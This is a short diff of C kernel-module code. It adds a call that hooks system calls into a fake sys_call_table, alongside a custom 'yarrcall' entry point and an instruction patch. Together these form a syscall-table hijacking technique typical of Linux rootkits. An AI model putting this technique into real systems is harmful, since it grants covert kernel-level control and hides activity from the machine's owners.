@@ -10,6 +10,7 @@
 #include "utils.h"
 #include "patch.h"
 #include "yarrcall.h"
+#include "hook_syscalls.h"
 
 // Our fake sys_call_table.
 unsigned long __fake_sct[__NR_syscall_max+1];
@@ -84,6 +85,9 @@ int __hook_syscall_table_64(void) {
 
     // Install our entry point.
     __fake_sct[YARR_VECTOR] = (unsigned long)entry_yarrcall;
+
+    // Hook all system calls we need to give a special treatment.
+    err = hook_syscalls(__fake_sct, sys_call_table);
 
     // Now we patch the instruction from where we got the sys_call_table
     // with our fake sys_call_table.
